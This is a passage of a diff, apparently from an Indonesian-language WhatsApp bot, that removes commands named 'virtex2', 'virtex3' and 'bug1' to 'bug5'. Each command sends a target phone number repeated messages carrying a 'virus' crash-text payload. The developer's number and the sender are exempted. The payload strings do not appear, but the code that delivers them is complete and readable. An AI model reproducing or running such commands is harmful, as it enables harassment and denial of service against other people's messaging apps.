-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'virtex2': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'virtex3': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'bug1': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'bug2': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'bug3': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'bug4': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        await sleep(3000)
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
-      case 'bug5': {
-        if (!q) return reply(`Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`)
-        var num = q + "@s.whatsapp.net"
-        var dev = '6283834558105@s.whatsapp.net'
-        if (num == dev) return reply('Itu developer gua')
-        if (num == sender) return reply('itu nomor lu sendiri')
-        await sleep(3000)
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: 'p' }, { quoted: virusnya })
-        await sleep(3000)
-        conn.sendMessage(num, { text: virus }, { quoted: virusnya })
-        await sleep(3000)
-        mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
-      }
-        break
 
       default:
 
